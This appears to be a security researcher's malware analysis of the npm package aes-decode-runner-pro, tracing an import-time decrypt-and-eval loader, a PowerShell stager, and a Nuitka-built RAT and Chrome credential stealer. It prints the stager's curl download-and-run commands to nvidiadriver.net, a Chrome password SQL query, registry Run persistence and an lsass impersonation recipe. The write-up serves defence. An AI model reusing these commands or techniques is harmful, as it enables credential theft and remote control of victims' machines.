---
title: "aes-decode-runner-pro: an npm 'AES SDK' that decrypts itself into a Nuitka Chrome stealer"
date: 2026-05-27
summary: "aes-decode-runner-pro@1.0.9 ships as a `position-unit-codec → encode-decode-codec → AES-GCM` demo whose `index.js` calls `pkg.run()` on import. `run()` decrypts a 6 KB ciphertext hardcoded in `defaults.js` with a hardcoded passphrase and `new Function()`s the result — a PowerShell stager that pulls a 6 MB bundle from `nvidiadriver.net` and runs `wscript update.vbs`. The bundle is a renamed CPython 3.10 plus three Nuitka-compiled modules: a custom-protocol RAT, a Chrome credential dumper that impersonates `lsass.exe` to defeat app-bound encryption, and a thin support library."
packageName: aes-decode-runner-pro
ecosystem: npm
---

`abdrizak <aabdirizak13@gmail.com>` registered `aes-decode-runner-pro` on 2026-05-25 and walked it from `1.0.1` to `1.0.10` inside 24 hours. The pitch is dry enough to pass a glance — *Layered custom codec pipeline with position-unit-codec, encode-decode-codec, and AES-GCM* — and the two declared dependencies are real, harmless utilities (`franknice <frankpernice429@gmail.com>` publishes both) that genuinely provide the outer two layers of the pipeline. The trick lives one file inside.

## Stage 1: `require()` is the trigger

`index.js` is three lines and they all matter:

<pre class="lang-js"><code><span class="tok-kw">const</span> pkg = <span class="tok-builtin">require</span>(<span class="tok-str">"./custom-codec"</span>);
pkg.<span class="tok-fn">run</span>();
module.exports = pkg;
</code></pre>

`pkg.run` is `runDefaultDecodedFunction` in `src/pipeline/custom-codec-pipeline.js`. It pulls a 6 KB AES-GCM ciphertext (`DEFAULT_FINAL_ENCODED_TEXT`) and the key material out of `src/config/defaults.js` — passphrase `default-dev-passphrase`, salt `encode-npm-c-salt`, both string literals beside it — scrypt-derives a 32-byte key, runs `aes-256-gcm` decrypt, peels the outer two codec layers off, and hands the result to:

<pre class="lang-js"><code><span class="tok-kw">new</span> <span class="tok-fn">Function</span>(<span class="tok-str">"require"</span>, runnable)(<span class="tok-builtin">require</span>);
</code></pre>

`eval` with one indirection. There is no `postinstall` — anything that types `require('aes-decode-runner-pro')` on any platform fires the chain. The README is a four-line definition of AES.

| | Trait | What cleave caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `supply-chain/install-hook/library/import-time-eval` | `index.js` calls `pkg.run()` unconditionally on `require` |
| <span class="sev-dot hostile" title="hostile"></span> | `command-and-control/remote-command/protocol/new-function-decoded-string` | `new Function("require", runnable)(require)` on the decrypted blob |
| <span class="sev-dot hostile" title="hostile"></span> | `anti-static/obfuscation/encoding/aes-gcm-static-key` | passphrase `default-dev-passphrase` + salt `encode-npm-c-salt` + ciphertext all hardcoded in `defaults.js` |
| <span class="sev-dot suspicious" title="suspicious"></span> | `supply-chain/metadata-anomaly/package/npm` | empty `author`, no repository URL, 10 versions in 24 h, `start`/`test`/`decode` scripts all point at a `crypto/lib.min.js` that isn't in the tarball |

## Stage 2: a self-deleting PowerShell stager

The AES blob decrypts to a small Node script with one job — drop a `.ps1`, run it, unlink it:

<pre class="lang-js"><code><span class="tok-kw">const</span> key = <span class="tok-str">"AB59097(*^^zxcvbn"</span>;
<span class="tok-kw">const</span> number = <span class="tok-str">"69 52 42 52 105 59 38 42 113 152 …"</span>; <span class="tok-com">// 224 ints</span>
<span class="tok-com">// per byte: k = key[j] + 103; out = k &gt;= num ? k - num : num</span>
fs.<span class="tok-fn">writeFileSync</span>(<span class="tok-str">"settings.ps1"</span>, decoded);
<span class="tok-kw">const</span> ps = <span class="tok-builtin">require</span>(<span class="tok-str">"child_process"</span>)
  .<span class="tok-fn">exec</span>(<span class="tok-str">'powershell -ExecutionPolicy Bypass -File ./settings.ps1'</span>);
ps.<span class="tok-fn">on</span>(<span class="tok-str">"exit"</span>, () =&gt; fs.<span class="tok-fn">unlinkSync</span>(<span class="tok-str">"settings.ps1"</span>));
</code></pre>

The "encryption" is one byte of XOR-ish arithmetic per character; running it against the 224-integer table yields three lines:

<pre class="lang-ps1"><code>curl.exe -k -o "$env:TEMP\winPatch.zip" http://nvidiadriver.net/verv1432/winpatch-bd9e.win
Expand-Archive -Force -Path "$env:TEMP\winPatch.zip" -DestinationPath "$env:TEMP\winPatch"
wscript "$env:TEMP\winPatch\update.vbs"
</code></pre>

`-k` skips TLS — the host is plain HTTP anyway. `nvidiadriver.net` resolves to `95.216.92.207` (Hetzner, Helsinki) and answers with `Server: Express`, full helmet/CSP/HSTS headers, and `Content-Disposition: attachment; filename="win-driver-bd9e.zip"` — the kind of front-end you stand up once and reuse across campaigns. The path label `verv1432` is the only campaign identifier in the chain.

| | Trait | What cleave caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `command-and-control/dropper/execution/network-stage/curl-powershell-vbs` | `curl.exe -k` → `Expand-Archive` → `wscript update.vbs` written verbatim by the decrypted stager |
| <span class="sev-dot suspicious" title="suspicious"></span> | `anti-static/obfuscation/encoding/numeric-table-xor` | 224 decimal ints + 17-byte ASCII key, decoded with `k = key[j]+103; out = k≥num ? k-num : num` |
| <span class="sev-dot suspicious" title="suspicious"></span> | `command-and-control/infrastructure/typosquat-domain` | `nvidiadriver.net` — NVIDIA lookalike on Hetzner, Express + helmet front-end |
| <span class="sev-dot suspicious" title="suspicious"></span> | `evasion/self-delete/file/script` | `fs.unlinkSync("settings.ps1")` fires on the `exec` `exit` event |
| <span class="sev-dot notable" title="notable"></span> | `evasion/transport/tls/ignore-validation` | `curl.exe -k` on the staging fetch |

## Stage 3: a 6 MB Nuitka bundle masquerading as a Windows patch

`winpatch-bd9e.zip` (6,016,747 B, store-compressed) carries a full CPython 3.10 runtime plus three malicious `.pyd` modules. `chost.exe` (98 KB, dated 2021-10-04) is unmodified `python.exe` renamed — the PDB path `D:\_w\1\b\bin\amd64\python.pdb` and the Python Software Foundation cert string are intact in the binary; it imports `Py_Main` from `python310.dll` and does nothing else. The malware sits in the three `.pyd` files alongside it.

All three announce themselves as Nuitka-compiled — `__nuitka_version__`, `__compiled__`, and `PyMarshal_ReadObjectFromString` all sit in `.rdata`. The actual constants live in Nuitka's compressed blob, so the C2 URL itself is not directly grep-able, but the Unicode string table around the blob is enough to read the design back out.

### `audiodriver.cp310-win_amd64.pyd` — a custom-protocol RAT

The plaintext constants describe a beacon-and-task loop. The protocol is named `htxp` (`htxp0825Exchange`); the server URL is read from a constant called `SVR0825URL`; the agent identifies itself with `MACHINE0825HOST`, `genUUID0825`, and `PID0825NAME`. Seven verbs, seven handlers:

| Verb | Handler | What it does |
| --- | --- | --- |
| `COMMAND0825AUTO` | `process0825Auto` | Loads and runs `auto.pyd` (the Chrome stealer below) |
| `COMMAND0825TERMINAL` | `process0825Terminal` | Spawn `cmd` / shell command, return output |
| `COMMAND0825FILE_UPLOAD` | `process0825Upload` | Push a file from disk to the C2 |
| `COMMAND0825FILE_DOWNLOAD` | `process0825Download` | Pull a file from the C2 to disk |
| `COMMAND0825INFORMATION` | `process0825Info` | Beacon host details |
| `COMMAND0825WAIT` | `process0825Wait` | Sleep before next beacon (`DURATION0825ERROR_WAIT`) |
| `COMMAND0825EXIT` | `process0825Exit` | Tear down the agent |

Persistence is `regStartup`: `KEY_SET_VALUE` against `HKEY_CURRENT_USER\…\Run`, value set to `wscript.exe "…update.vbs"` — the same VBS the Stage-2 PowerShell just launched. The agent re-launches itself on next logon. Wire-frame encoding helpers (`make0825Msg`, `decode0825Msg`, `cmd_style`, `msg_style`) are present but their bodies live in the compressed constants blob.

| | Trait | What cleave caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `command-and-control/remote-access/custom-protocol/named-verbs` | `htxp0825Exchange` + seven `COMMAND0825…` verbs with one handler each |
| <span class="sev-dot hostile" title="hostile"></span> | `command-and-control/backdoor/control/file-manager` | `process0825Upload` / `process0825Download` reach arbitrary disk paths |
| <span class="sev-dot hostile" title="hostile"></span> | `command-and-control/remote-access/shell/terminal-handler` | `process0825Terminal` returns command output across the channel |
| <span class="sev-dot suspicious" title="suspicious"></span> | `persistence/login/registry/autostart` | `HKCU\…\Run` → `wscript.exe "$env:TEMP\winPatch\update.vbs"` |
| <span class="sev-dot suspicious" title="suspicious"></span> | `anti-static/packing/nuitka/standalone` | `__nuitka_version__`, `__compiled__`, `PyMarshal_ReadObjectFromString`; constants in Nuitka's compressed blob |

### `auto.cp310-win_amd64.pyd` — Chrome stealer with `lsass` impersonation

Routine half: open `\AppData\Local\Google\Chrome\User Data\Login Data` (Chrome's password SQLite) and run

<pre class="lang-sql"><code><span class="tok-kw">SELECT</span> origin_url, username_value, password_value, date_created <span class="tok-kw">FROM</span> logins;
</code></pre>

then write the rows to `chrome_logins_dump.txt` and label it `Chrome Saved Logins Dump`. `Local Extension Settings` is folded into the same package (`azipDirectories`) — that's where browser-wallet extensions keep their stores. The fast path uses `NCryptOpenStorageProvider("Microsoft Software Key Storage Provider")` against the per-profile key; the prefix constants `uGD8BPtAH` and `uQH9CXuKH` match Chrome's `DPAPI`- and `v20`-wrapped key headers.

The interesting half is what happens when that fast path returns `NCryptOpenKey failed`. Chrome's app-bound encryption (ABE) ties the v20 key to a SYSTEM-only DPAPI scope, so a user-context decrypt cannot unwrap it. The module's answer is a constant block in plain text:

```
impersonate lsass.exe to get SYSTEM privilege
aSeDebugPrivilege
aTokenImpersonation
aSecurityImpersonation
aimppersonation_token
```

Enable `SeDebugPrivilege` on the current token, open `lsass.exe`, duplicate its primary token, impersonate, retry the `NCrypt` unwrap inside SYSTEM context, and Chrome's ABE falls open. This is the public Google-Chrome-App-Bound-Encryption-Decryption / Chromium ABE-bypass recipe, packaged as a Nuitka module.

| | Trait | What cleave caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `credential-access/browser/chrome/lsass-impersonation-abe-bypass` | `SeDebugPrivilege` + `lsass.exe` token duplication to unwrap the v20 app-bound key |
| <span class="sev-dot hostile" title="hostile"></span> | `exfiltration/stealer/credential/browser/chrome-login-data-sqlite` | `SELECT origin_url, username_value, password_value, date_created FROM logins` → `chrome_logins_dump.txt` |
| <span class="sev-dot hostile" title="hostile"></span> | `exfiltration/stealer/credential/browser/wallet-extension-store` | `Local Extension Settings` folded into `zipDirectories` |
| <span class="sev-dot suspicious" title="suspicious"></span> | `defense-evasion/access-token/duplicate-primary` | `NCryptOpenStorageProvider` retried under an impersonated SYSTEM token |

### `api.cp310-win_amd64.pyd` — the thin support module

Same Nuitka shape, no app-specific verbs in the surviving string table — just the standard `importlib.metadata` shim Nuitka emits, `application/octet-stream`, and the Python ABI surface. It exports `PyInit_api`, which `audiodriver` imports for shared helpers. Worth hashing for IOC purposes; not worth a deeper write-up on its own.

## Indicators

| Type | Value |
| --- | --- |
| Package | `aes-decode-runner-pro@1.0.9` (npm) |
| npm page | [npmjs.com/package/aes-decode-runner-pro](https://www.npmjs.com/package/aes-decode-runner-pro) |
| Published | `2026-05-26T16:24:58Z` (`1.0.10` followed 19 min later) |
| Tarball SHA-256 | `b7ebd4ee16d33e8210f48b3f2b1ef8e894d9726ee4d687c7e9a6c4d1b3043b40` |
| Tarball SHA-1 (npm `shasum`) | `44add86a440f1c2928604298f0f8e49685d5086a` |
| `src/config/defaults.js` SHA-256 | `1a7ab170e96f20a25eba56b9fcecee5cf4e49ba51533f5504f40e48ec52161de` |
| AES key material | passphrase `default-dev-passphrase`, salt `encode-npm-c-salt`, `scrypt` → `aes-256-gcm` |
| Stage-2 XOR key | `AB59097(*^^zxcvbn` (`k = key[j]+103; out = k≥n ? k-n : n`) |
| Trigger | `require('aes-decode-runner-pro')` → `pkg.run()` (no `postinstall` needed) |
| Stage-3 URL | `http://nvidiadriver.net/verv1432/winpatch-bd9e.win` → `95.216.92.207` (Hetzner) |
| Stage-3 zip SHA-256 | `ddd5bd20fd92d4671073096c3e9230e9d3465588f6f7db0abb9618ed3339312a` (6,016,747 B) |
| `chost.exe` SHA-256 | `94a83686261e9364cf3386b61a01a9f70936e8547da8962d16f1f850226b8954` (CPython 3.10 `python.exe`) |
| `api.cp310-win_amd64.pyd` SHA-256 | `50ffce607867d8fa8eaf6ef5cd25a3c0e7e4415e881b9e55c04a67bcddb74fdf` |
| `audiodriver.cp310-win_amd64.pyd` SHA-256 | `164e322d6fbc62e254d73583acd7f39444c884d3f5e6a5d27db143fc25bc88b3` |
| `auto.cp310-win_amd64.pyd` SHA-256 | `17832aa629524ef6e8d8d6e9b6b902a8d324b559e3c36dbd0e221ab1690be871` |
| Persistence | `HKCU\…\Run` → `wscript.exe "$env:TEMP\winPatch\update.vbs"` |
| Publisher | `abdrizak <aabdirizak13@gmail.com>` |